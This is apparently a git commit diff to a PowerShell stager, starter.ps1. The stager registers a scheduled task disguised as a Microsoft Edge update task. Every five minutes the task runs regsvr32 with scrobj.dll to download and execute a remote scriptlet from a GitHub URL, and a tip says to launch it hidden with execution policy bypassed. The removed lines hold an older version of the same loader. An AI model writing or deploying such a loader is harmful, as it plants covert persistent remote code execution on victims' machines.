51f39f31486d5a4c8f7c58686c5c0cc950f73841
b3at1 <sambederman@gmail.com>
2026-02-18 21:10:32 -0600

    finally fix starter (wrap cmd -c)

--- starter.ps1
+++ starter.ps1
@@ -1,14 +1,3 @@
 # TIP: invoke with `powershell.exe -w hidden -nop -ExecutionPolicy Bypass -Command`
 # new command
-schtasks /create /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore" /tr "regsvr32 /s /n /u /i:https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/WPXService.wsc scrobj.dll" /sc minute /mo 5 /f; $t = Get-ScheduledTask "MicrosoftEdgeUpdateUpdaterTaskMachineCore"; $t.Settings.StartWhenAvailable = $true; Set-ScheduledTask -InputObject $t; schtasks /run /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore"
-# old powershell
-$taskName = "MicrosoftEdgeUpdateUpdaterTaskMachineCore"s
-if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
-    Start-ScheduledTask -TaskName $taskName
-} else {
-    $action = New-ScheduledTaskAction -Execute "regsvr32.exe" -Argument "/s /n /u /i:https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/WPXService.wsc scrobj.dll"
-    $trigger1 = New-ScheduledTaskTrigger -AtLogOn
-    $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue)
-    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2) -Force
-}
-'''
+schtasks /create /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore" /tr "cmd /c regsvr32 /s /n /u /i:https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/WPXService.wsc scrobj.dll" /sc minute /mo 5 /f; $t = Get-ScheduledTask "MicrosoftEdgeUpdateUpdaterTaskMachineCore"; $t.Settings.StartWhenAvailable = $true; Set-ScheduledTask -InputObject $t; schtasks /run /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore"
